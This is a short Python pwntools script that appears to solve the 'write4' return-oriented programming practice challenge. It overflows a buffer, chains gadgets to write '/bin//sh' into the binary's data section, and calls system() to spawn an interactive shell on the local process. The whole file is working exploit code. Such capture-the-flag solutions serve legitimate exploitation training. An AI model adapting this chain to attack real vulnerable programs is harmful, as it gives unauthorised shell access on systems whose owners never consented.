#!/usr/bin/python

from pwn import *

garbage = "A"*40

system_addr = p64(0x00000000004005e0)
data_section = p64(0x0000000000601050)

#0x0000000000400820 <+0>:       mov    QWORD PTR [r14],r15
mov_r14_r15 = p64(0x0000000000400820)

#0x00400890 : (b'415e415fc3')   pop r14; pop r15; ret
pop_r14_pop_r15 = p64(0x00400890)

#0x00400893 : (b'5fc3') pop rdi; ret
pop_rdi = p64(0x00400893)

exploit = garbage
exploit += pop_r14_pop_r15
exploit += data_section
exploit += '/bin//sh'
exploit += mov_r14_r15
exploit += pop_rdi
exploit += data_section
exploit += system_addr

p = process("./write4")

p.sendlineafter("> ", exploit)
p.interactive()
